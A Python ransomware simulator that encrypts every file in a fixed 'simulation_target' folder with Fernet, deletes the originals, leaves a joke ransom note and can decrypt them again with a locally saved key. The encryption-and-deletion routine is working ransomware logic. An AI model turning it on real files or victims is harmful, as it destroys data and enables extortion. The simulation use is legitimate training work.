import os
from cryptography.fernet import Fernet
import sys

# SAFEGUARD: STRICTLY LIMIT TO THIS DIRECTORY
TARGET_DIR = "simulation_target"
KEY_FILE = "thekey.key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_files():
    if not os.path.exists(TARGET_DIR):
        print(f"Error: Target directory '{TARGET_DIR}' does not exist.")
        return

    print(f"[*] Generating key and encrypting files in '{TARGET_DIR}'...")
    key = generate_key()
    fernet = Fernet(key)
    
    files_encrypted = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file == "ransom_note.txt" or file.endswith(".locked"):
                continue
                
            file_path = os.path.join(root, file)
            print(f"    Encrypting {file}...")
            
            with open(file_path, "rb") as f:
                original = f.read()
            
            encrypted = fernet.encrypt(original)
            
            with open(file_path + ".locked", "wb") as f:
                f.write(encrypted)
            
            os.remove(file_path)
            files_encrypted += 1

    if files_encrypted > 0:
        with open(os.path.join(TARGET_DIR, "ransom_note.txt"), "w") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
            note.write("Send 100 BTC to decrypt them.\n")
            note.write("(Just kidding, run this script with --decrypt)")
        print(f"[+] Encrypted {files_encrypted} files. Key saved to '{KEY_FILE}'.")
    else:
        print("[-] No files found to encrypt.")

def decrypt_files():
    if not os.path.exists(KEY_FILE):
        print("[-] Key file not found. Cannot decrypt.")
        return

    print(f"[*] Decrypting files in '{TARGET_DIR}'...")
    key = load_key()
    fernet = Fernet(key)
    
    files_decrypted = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(".locked"):
                file_path = os.path.join(root, file)
                print(f"    Decrypting {file}...")
                
                with open(file_path, "rb") as f:
                    encrypted = f.read()
                
                try:
                    decrypted = fernet.decrypt(encrypted)
                except Exception as e:
                    print(f"    [!] Failed to decrypt {file}: {e}")
                    continue
                
                original_path = file_path[:-7] # Remove .locked
                with open(original_path, "wb") as f:
                    f.write(decrypted)
                
                os.remove(file_path)
                files_decrypted += 1
    
    # Clean up note
    note_path = os.path.join(TARGET_DIR, "ransom_note.txt")
    if os.path.exists(note_path):
        os.remove(note_path)

    print(f"[+] Decrypted {files_decrypted} files.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python simulator.py [encrypt|decrypt]")
        sys.exit(1)
        
    action = sys.argv[1].lower()
    
    if action == "encrypt":
        encrypt_files()
    elif action == "decrypt":
        decrypt_files()
    else:
        print("Invalid action.")

if __name__ == "__main__":
    main()
